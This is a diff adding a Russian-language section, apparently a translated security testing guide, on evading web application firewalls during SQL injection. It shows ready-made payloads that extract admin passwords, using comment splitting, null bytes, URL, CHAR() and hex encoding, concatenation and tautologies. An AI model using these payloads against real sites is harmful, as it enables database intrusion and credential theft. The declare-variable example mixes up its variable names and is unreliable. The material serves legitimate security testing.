@@ -678,7 +678,123 @@ text
 
 
 
+### обход waf 
 
+Методы используются для обхода средств защиты, таких как брандмауэры веб-приложений (WAF) или системы предотвращения вторжений (IPS). 
+
+#### Пробел
+
+Отбрасывание пробелов или добавление пробелов, которые не повлияют на оператор SQL. Например
+
+```sql
+or 'a'='a'
+
+or 'a'  =    'a'
+```
+
+Добавление специального символа, такого как новая строка или табуляция, которые не изменят выполнение оператора SQL. Например,
+
+```sql
+or
+'a'=
+        'a'
+```
+
+#### Нулевые байты
+
+Используйте нулевой байт (%00) перед любыми символами, которые фильтр блокирует.
+
+Например, если злоумышленник может внесить следующий SQL
+
+`' UNION SELECT password FROM Users WHERE username='admin'--`
+
+добавить Null Bytes будет
+
+`%00' UNION SELECT password FROM Users WHERE username='admin'--`
+
+#### Комментарии SQL
+
+Добавление встроенных комментариев SQL также может помочь оператору SQL быть действительным и обойти фильтр SQL-инъекции. Возьмем эту SQL-инъекцию в качестве примера.
+
+`' UNION SELECT password FROM Users WHERE name='admin'--`
+
+Добавление встроенных комментариев SQL будет.
+
+`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`
+
+`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`
+
+#### Кодирование URL-адресов
+
+Используйте [онлайн](https://meyerweb.com/eric/tools/dencoder/)-[кодирование URL-адреса](https://meyerweb.com/eric/tools/dencoder/) для кодирования оператора SQL
+
+`' UNION SELECT password FROM Users WHERE name='admin'--`
+
+Кодирование URL-адреса оператора SQL-инъекции будет
+
+`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`
+
+#### Кодирование символов
+
+Функция Char() может быть использована для замены английского char. Например, char(114,111,111,116) означает корень
+
+`' UNION SELECT password FROM Users WHERE name='root'--`
+
+Чтобы применить Char(), оператор SQL injectiton будет
+
+`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`
+
+#### Конкатенация строк
+
+Concatenation разбивает ключевые слова SQL и уклоняется от фильтров. Синтаксис конкатенации варьируется в зависимости от механизма базы данных. Возьмем в качестве примера движок MS SQL
+
+`select 1`
+
+Простая инструкция SQL может быть изменена, как показано ниже, используя конкатенацию
+
+`EXEC('SEL' + 'ECT 1')`
+
+#### Шестиденатексное Кодирование
+
+Hex encoding technique uses Hexadecimal encoding to replace original SQL statement char. For example, `root` can be represented as `726F6F74`
+
+`Select user from users where name = 'root'`
+
+Оператор SQL с использованием значения HEX будет:
+
+`Select user from users where name = 726F6F74`
+
+или
+
+`Select user from users where name = unhex('726F6F74')`
+
+#### Объявить переменные
+
+Объявите оператор SQL-инъекции в переменную и выполните его.
+
+Например, инструкция SQL-инъекции ниже
+
+`Union Select password`
+
+Определите инструкцию SQL в переменную`SQLivar`
+
+```sql
+; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
+EXEC(@SQLivar)
+```
+
+#### Альтернативное выражение 'или 1 = 1'
+
+```sql
+OR 'SQLi' = 'SQL'+'i'
+OR 'SQLi' &gt; 'S'
+or 20 &gt; 1
+OR 2 between 3 and 1
+OR 'SQLi' = N'SQLi'
+1 and 1 = 1
+1 || 1 = 1
+1 && 1 = 1
+```
 
 
 
